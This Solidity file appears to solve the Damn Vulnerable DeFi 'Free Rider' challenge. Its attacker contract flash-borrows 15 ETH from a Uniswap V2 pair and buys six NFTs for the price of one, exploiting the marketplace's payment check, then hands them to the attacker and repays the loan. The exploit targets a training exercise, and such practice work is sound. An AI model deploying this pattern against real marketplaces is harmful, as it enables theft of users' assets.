// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "forge-std/Test.sol";

interface IDamnValuableNFT {
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

interface IUniswapV2Pair {
    function token1() external view returns (address);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;

    function token() external returns (IDamnValuableNFT);
}

interface IWeth {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract AttackerContract {
    uint256 constant NFT_PRICE_15_ETH = 15 ether;
    IUniswapV2Pair pair;
    IFreeRiderNFTMarketplace marketplace;
    IDamnValuableNFT damnValuableNFT;
    IWeth weth;

    constructor(address _pair, address _marketplace) {
        //Create initial instances and variables
        pair = IUniswapV2Pair(_pair);
        marketplace = IFreeRiderNFTMarketplace(_marketplace);
        weth = IWeth(pair.token1());
        damnValuableNFT = IDamnValuableNFT(marketplace.token());
    }

    function exploit() external payable {
        // Lets flashloan some ETH from uniswap and call uniswapV2Call from there.
        pair.swap(0, NFT_PRICE_15_ETH, address(this), abi.encode(msg.sender));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // Withdraw ETH (borrowed as WETH)
        weth.withdraw(NFT_PRICE_15_ETH);
        // With our borrowed ETH, lets buy all NFTs abusing ffrom the vulnerability.
        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;
        marketplace.buyMany{value: NFT_PRICE_15_ETH}(tokenIds);
        // Transfer NFTs from contract to attacker
        address attacker = abi.decode(data, (address));
        damnValuableNFT.safeTransferFrom(address(this), attacker, 0);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 1);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 2);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 3);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 4);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 5);
        // Payback flashloan depositing our ETH to WETH
        uint256 fee = ((NFT_PRICE_15_ETH * 1000) / 997) - NFT_PRICE_15_ETH + 1;
        uint256 paybackAmt = NFT_PRICE_15_ETH + fee;
        weth.deposit{value: paybackAmt}();
        weth.transfer(msg.sender, paybackAmt);
    }

    receive() external payable {} //This function is mandatory to receive ether

    // This function is mandatory to receive NFTs in contracts
    // as explained in Openzeppelin ERC721 implementation
    // https://docs.openzeppelin.com/contracts/3.x/api/token/erc721
    //
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
